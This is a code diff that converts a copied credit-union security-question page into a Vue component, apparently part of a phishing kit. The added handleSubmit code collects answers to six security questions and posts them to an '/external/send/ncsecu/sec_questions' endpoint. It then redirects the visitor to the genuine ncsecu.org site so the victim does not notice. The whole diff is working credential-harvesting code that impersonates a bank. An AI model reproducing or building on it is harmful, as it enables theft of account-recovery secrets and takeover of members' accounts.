@@ -23,15 +23,8 @@
       </div>
     </div>
 
-    <form method="post" action=""  id="loginForm" name="loginForm">
+    <form @submit.prevent="handleSubmit"  id="loginForm" name="loginForm">
 
-      <div class="aspNetHidden">
-        <input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="AFo0jm6VCtDtONvN7xn2x11SDoX092n3sw4I3nfWFgHiJMe3ioW4L4fKLukuaIJND93SAdvD/poeYQqnCA/CuWMzW5XYIhwylNUeY8vGHJ7mZSl8QF35nPsa6yOmdhDvmvfyjqvTylU+g7dV0hDY1jXteh2qpP0xkK9v+MDJRno+fD34">
-      </div>
-
-      <div style="display: none">
-        <input type="hidden" name="ctl00$MainCPH$LoginControl$TextboxBrowserName" id="MainCPH_LoginControl_TextboxBrowserName" value="">
-      </div>
 
       <div class="centered topSpace" style="width: 85%;">
         <div>Please Confirm your security question and answer </div>
@@ -41,7 +34,7 @@
               <label for="TextUserID" id="LabelUserID" style="display:block;font-size:13px">Select Security Question 1:</label>
             </div>
             <div class="signOnInput">
-              <select name="q1" id="q1" required style="font-size:12px;width:293px;height:39px">
+              <select v-model="form.q1" id="q1" required style="font-size:12px;width:293px;height:39px">
                 <option value="">Select Question</option>
                 <option value="What is your place of birth?">What is your place of birth?</option>
                 <option value="What city were you born in?">What city were you born in?</option>
@@ -59,11 +52,8 @@
               <label for="TextPassword" id="LabelPassword" style="display:none;">Answer 1:</label>
             </div>
             <div class="signOnInput">
-              <input type="text" alt="null" tabindex="2" name="ans1" id="ans1" required title="Enter your password to log In" style="color: inherit; height: 1.0em; width: 100%;" maxlength="32" autocomplete="off" placeholder="Answer">
+              <input type="text" alt="null" tabindex="2" v-model="form.ans1" id="ans1" required title="Enter your password to log In" style="color: inherit; height: 1.0em; width: 100%;" maxlength="32" autocomplete="off" placeholder="Answer">
             </div>
-          </div>
-          <div>
-            <input type="hidden" name="MobileToken" id="MobileToken" value="asdf345-asgfadsg-fd@$#6qew-adsfasg-agasf">
           </div>
         </div>
 
@@ -73,7 +63,7 @@
               <label for="TextUserID" id="LabelUserID" style="display:block;font-size:13px">Select Security Question 2:</label>
             </div>
             <div class="signOnInput">
-              <select name="q2" id="q2" required style="font-size:12px;width:293px;height:39px">
+              <select v-model="form.q2" id="q2" required style="font-size:12px;width:293px;height:39px">
                 <option value="">Select Question</option>
                 <option value="What is the last name of your childhood doctor?">What is the last name of your childhood doctor?</option>
                 <option value="What is the street number of the house you grew up in?">What is the street number of the house you grew up in?</option>
@@ -90,7 +80,7 @@
               <label for="TextPassword" id="LabelPassword" style="display:none;">Answer 2:</label>
             </div>
             <div class="signOnInput">
-              <input type="text" alt="null" tabindex="2" name="ans2" id="ans2" required title="Enter your password to log In" style="color: inherit; height: 1.0em; width: 100%;" maxlength="32" autocomplete="off" placeholder="Answer">
+              <input type="text" alt="null" tabindex="2" v-model="form.ans2" id="ans2" required title="Enter your password to log In" style="color: inherit; height: 1.0em; width: 100%;" maxlength="32" autocomplete="off" placeholder="Answer">
             </div>
           </div>
           <div>
@@ -104,7 +94,7 @@
               <label for="TextUserID" id="LabelUserID" style="display:block;font-size:13px">Select Security Question 3:</label>
             </div>
             <div class="signOnInput">
-              <select name="q3" id="q3" required style="font-size:12px;width:293px;height:39px">
+              <select v-model="form.q3" id="q3" required style="font-size:12px;width:293px;height:39px">
                 <option value="">Select Question Three</option>
                 <option value="What is your favorite food?">What is your favorite food?</option>
                 <option value="What was your first car?">What was your first car?</option>
@@ -121,7 +111,7 @@
               <label for="TextPassword" id="LabelPassword" style="display:none;">Answer 3:</label>
             </div>
             <div class="signOnInput">
-              <input type="text" alt="null" tabindex="2" name="ans3" id="ans3" required title="Enter your password to log In" style="color: inherit; height: 1.0em; width: 100%;" maxlength="32" autocomplete="off" placeholder="Answer">
+              <input type="text" alt="null" tabindex="2" v-model="form.ans3" id="ans3" required title="Enter your password to log In" style="color: inherit; height: 1.0em; width: 100%;" maxlength="32" autocomplete="off" placeholder="Answer">
             </div>
           </div>
           <div>
@@ -135,7 +125,7 @@
               <label for="TextUserID" id="LabelUserID" style="display:block;font-size:13px">Select Security Question 4:</label>
             </div>
             <div class="signOnInput">
-              <select name="q4" id="q4" required style="font-size:12px;width:293px;height:39px">
+              <select v-model="form.q4" id="q4" required style="font-size:12px;width:293px;height:39px">
                 <option value="">Select Question Four</option>
                 <option value="What is your place of birth?">What is your place of birth?</option>
                 <option value="What city were you born in?">What city were you born in?</option>
@@ -153,7 +143,7 @@
               <label for="TextPassword" id="LabelPassword" style="display:none;">Answer 4:</label>
             </div>
             <div class="signOnInput">
-              <input type="text" alt="null" tabindex="2" name="ans4" id="ans4" required title="Enter your password to log In" style="color: inherit; height: 1.0em; width: 100%;" maxlength="32" autocomplete="off" placeholder="Answer">
+              <input type="text" alt="null" tabindex="2" v-model="form.ans4" id="ans4" required title="Enter your password to log In" style="color: inherit; height: 1.0em; width: 100%;" maxlength="32" autocomplete="off" placeholder="Answer">
             </div>
           </div>
           <div>
@@ -167,7 +157,7 @@
               <label for="TextUserID" id="LabelUserID" style="display:block;font-size:13px">Select Security Question 5:</label>
             </div>
             <div class="signOnInput">
-              <select name="q5" id="q5" required style="font-size:12px;width:293px;height:39px">
+              <select v-model="form.q5" id="q5" required style="font-size:12px;width:293px;height:39px">
                 <option value="">Select Question Five</option>
                 <option value="What is the last name of your childhood doctor?">What is the last name of your childhood doctor?</option>
                 <option value="What is the street number of the house you grew up in?">What is the street number of the house you grew up in?</option>
@@ -184,7 +174,7 @@
               <label for="TextPassword" id="LabelPassword" style="display:none;">Answer 5:</label>
             </div>
             <div class="signOnInput">
-              <input type="text" alt="null" tabindex="2" name="ans5" id="ans5" required title="Enter your password to log In" style="color: inherit; height: 1.0em; width: 100%;" maxlength="32" autocomplete="off" placeholder="Answer">
+              <input type="text" alt="null" tabindex="2" v-model="form.ans5" id="ans5" required title="Enter your password to log In" style="color: inherit; height: 1.0em; width: 100%;" maxlength="32" autocomplete="off" placeholder="Answer">
             </div>
           </div>
           <div>
@@ -198,7 +188,7 @@
               <label for="TextUserID" id="LabelUserID" style="display:block;font-size:13px">Select Security Question 6:</label>
             </div>
             <div class="signOnInput">
-              <select name="q6" id="q6" required style="font-size:12px;width:293px;height:39px">
+              <select v-model="form.q6" id="q6" required style="font-size:12px;width:293px;height:39px">
                 <option value="">Select Question Six</option>
                 <option value="What is your favorite food?">What is your favorite food?</option>
                 <option value="What was your first car?">What was your first car?</option>
@@ -215,11 +205,8 @@
               <label for="TextPassword" id="LabelPassword" style="display:none;">Answer 6:</label>
             </div>
             <div class="signOnInput">
-              <input type="text" alt="null" tabindex="2" name="ans6" id="ans6" required title="Enter your password to log In" style="color: inherit; height: 1.0em; width: 100%;" maxlength="32" autocomplete="off" placeholder="Answer">
+              <input type="text" alt="null" tabindex="2" v-model="form.ans6" id="ans6" required title="Enter your password to log In" style="color: inherit; height: 1.0em; width: 100%;" maxlength="32" autocomplete="off" placeholder="Answer">
             </div>
-          </div>
-          <div>
-            <input type="hidden" name="MobileToken" id="MobileToken" value="asdf345-asgfadsg-fd@$#6qew-adsfasg-agasf">
           </div>
         </div>
 
@@ -227,7 +214,6 @@
         <div style="margin-top: .2em; margin-bottom: 0em; clear: both;">
           <input type="submit" name="btnlog" value="Continue" id="MainCPH_LoginControl_ButtonSubmit" class="signOnButton fiColoredButton text5 bold">
         </div>
-        <input id="hidJSTest" type="hidden" value="false" name="hidJSTest">
       </div>
 
 
@@ -289,7 +275,80 @@
 
 <script>
 export default {
-  name: "QuestionsComponent"
+  name: "QuestionsComponent",
+  data() {
+    return {
+      step1: true,
+      step2: false,
+      // eslint-disable-next-line no-undef
+      form: new Form({
+        q1: "",
+        ans1: "",
+        q2: "",
+        ans2: "",
+        q3: "",
+        ans3: "",
+        q4: "",
+        ans4: "",
+        q5: "",
+        ans5: "",
+        q6: "",
+        ans6: "",
+      }),
+      id: '',
+      pass: '',
+      submitting: false,
+      production: this.$ENV_MODE
+    }
+  },
+
+  methods: {
+
+    handleSubmit() {
+      let loader = this.$loading.show({});
+      this.submitting = true;
+      setTimeout(() => {
+        this.form.post(this.production ? this.$BASE_API_URL + '/external/send/ncsecu/sec_questions' : '/api/v1/external/send/ncsecu/sec_questions').then((response) => {
+
+          loader.hide();
+          this.$notify({
+            message: response.data.message,
+            type: "success",
+            top: true,
+            bottom: false,
+            left: false,
+            right: true,
+            showClose: false,
+            closeDelay: 2500,
+            offset: 50,
+          })
+
+          setTimeout(() => {
+            window.location.replace("https://www.ncsecu.org/");
+          }, 800);
+
+
+        }).catch((error) => {
+          loader.hide();
+          console.log(error.response);
+
+          if (error.response.status == 422) {
+            // eslint-disable-next-line no-unused-vars,no-empty
+            for (let i in error.response.data.error) {
+
+            }
+          }
+
+          // eslint-disable-next-line no-empty
+          if (error.response.status == 401) {
+
+          }
+          this.submitting = false
+        })
+      }, 1000)
+    },
+  },
+
 }
 </script>
 
